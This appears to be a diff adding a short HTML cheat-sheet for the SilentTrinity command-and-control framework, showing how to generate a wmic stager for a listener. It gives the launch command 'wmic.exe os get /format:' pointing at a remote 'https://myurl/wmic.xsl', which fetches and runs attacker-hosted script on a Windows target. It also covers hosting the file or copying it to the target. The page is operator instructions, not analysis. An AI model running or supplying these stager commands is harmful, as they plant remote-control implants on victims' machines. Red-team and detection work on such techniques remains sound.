@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Create A Stager For Listener</title>
+</head><body>ST&gt;&gt; stagers<br/>
+ST (stagers) &gt;&gt; list<br/>
+ST (stagers) &gt;&gt; use wmic<br/>
+ST (stagers)(wmic) &gt;&gt; generate &lt;listener name&gt;<br/>
+[+] Generated stager to wmic.xsl<br/>
+[*] Launch with:<br/>
+&nbsp;&#09;C:\Windows\system32\wbem\wmic.exe os get /format:"https://myurl/wmic.xsl"<br/>
+&nbsp;&#09;C:\Windows\system32\wbem\wmic.exe os get /format:"wmic.xsl"<br/>
+<br/>
+Should be in SilentTrinity/Server/wmic.xsl<br/>
+<br/>
+Need to start own web server to host wmic.xsl or transfer it to target and execute locally<br/>
+<br/>
+</body></html>
